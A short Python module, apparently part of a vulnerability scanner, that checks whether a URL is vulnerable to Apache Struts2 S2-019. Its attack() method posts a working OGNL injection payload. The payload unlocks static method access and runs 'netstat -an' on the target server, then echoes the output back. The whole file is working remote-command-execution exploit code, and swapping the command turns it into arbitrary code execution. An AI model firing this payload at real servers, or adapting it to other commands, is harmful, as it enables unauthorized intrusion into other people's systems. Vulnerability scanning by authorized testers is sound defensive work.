import requests

class struts2_019:
    def __init__(self, url):
        self.url = url

    def attack(self):
        print('test {} --> struts2_019'.format(self.url))
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        exp = '''debug=command&expression=#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'netstat','-an'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[10000],#d.read(#e),#resp.println(#e),#resp.close()'''
        self.url += exp
        try:
            resp = requests.post(self.url, data=exp, headers=headers, timeout=10)
            if "0.0.0.0" in resp.text:
                return "s2-019"
        except:
            #print('test --> struts2_019 Failed!')
            return None
        return None